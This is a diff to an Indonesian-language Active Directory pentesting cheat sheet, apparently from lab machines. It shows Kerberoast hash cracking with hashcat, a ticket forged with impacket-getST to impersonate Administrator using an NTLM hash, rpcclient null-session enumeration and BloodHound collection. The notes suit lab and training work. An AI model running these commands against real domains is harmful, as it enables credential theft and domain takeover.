@@ -1,3 +1,12 @@
+# Active Directory Enumeration
+## Tips n Trick
+1. Hal terpenting dalam AD adalah username karena dengan username kita bisa melanjutkan proses pentest untuk mendapatkan initial access
+2. Biasanya username ini bisa kita gunakan di smb dan rpc
+3. Ketika mendapatkan username, cek dengan kerbrute terlebih dahulu untuk memastikan user yang valid
+4. Kemudian jika mendapatkan creds, coba di SMB, RPC
+5. Kalau bisa di RPC jalankan enumdomusers untuk mendapatkan seluruh username
+
+
 # You Dont Have Credentials
 ## Enumerate user yang berada di AD
 Hal ini penting untuk initial access dan juga privesc, kita harus tau username yang digunakan untuk login ke AD agar bisa sampai ke DC. berikut adalah cara-caranya
@@ -7,6 +16,11 @@ Hal ini penting untuk initial access dan juga privesc, kita harus tau username y
 rpcclient 10.10.10.10 -U%
 ```
 Jika berhasil konek, gunakan perintah `enumdomusers`, nantinya akan tampil nama-nama username yang digunakan untuk login
+
+Perintah lainnya
+```
+enumprinters
+```
 
 Untuk perintah lainnya silahkan cek di ref
 
@@ -191,4 +205,20 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$862785a3274a83bc
 ### Crack the Kerberos hash
 ```
 hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
+```
+
+## Silver Ticket
+```
+impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :6bf735e60852b92212d512a4deadcfea
+```
+
+### Clock skew too great
+Hal ini terjadi ketika mesin attacker dan mesin victim memiliki waktu yang berbeda. Solution :
+```
+sudo ntpdate 10.10.10.248
+```
+
+## Bloodhound
+```
+bloodhound-python -u svc-print -p 'password' -d fabricorp.local -ns 10.10.10.193 -c All --zip
 ```
